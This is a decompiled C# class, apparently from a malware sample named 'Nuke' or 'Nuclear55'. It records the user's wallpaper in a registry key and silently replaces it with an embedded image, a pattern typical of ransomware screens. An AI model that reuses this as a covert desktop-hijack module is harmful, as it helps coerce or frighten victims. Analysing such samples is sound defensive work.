using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using ns0;

namespace Nuke;

public sealed class Desktop
{
	private const int int_0 = 20;

	private const int int_1 = 1;

	private const int int_2 = 2;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int int_3, int int_4, string string_0, int int_5);

	internal static RegistryKey smethod_0(string string_0 = "")
	{
		if (Registry.CurrentUser.OpenSubKey("Software\\Nuclear55" + string_0) == null)
		{
			Registry.CurrentUser.CreateSubKey("Software\\Nuclear55" + string_0);
		}
		return Registry.CurrentUser.OpenSubKey("Software\\Nuclear55" + string_0, writable: true);
	}

	public static void set()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Nuclear55";
			string text2 = text + "\\desktop_wallpaper.bmp";
			RegistryKey registryKey = smethod_0();
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			string value = registryKey2.GetValue("Wallpaper")!.ToString();
			((Image)Class3.background).Save(text2, ImageFormat.get_Bmp());
			registryKey.SetValue("Wallpaper", value);
			setBackground(text2);
		}
		catch
		{
		}
	}

	public static void setBackground(string newBG)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		if (getSystemVersion().ToLower().Contains("windows 10"))
		{
			registryKey.SetValue("WallpaperStyle", 0.ToString());
		}
		else
		{
			registryKey.SetValue("WallpaperStyle", 1.ToString());
		}
		registryKey.SetValue("TileWallpaper", 0.ToString());
		SystemParametersInfo(20, 0, newBG, 3);
	}

	public static string getSystemVersion()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
			return (string)registryKey.GetValue("ProductName");
		}
		catch
		{
			return "Unknown";
		}
	}
}
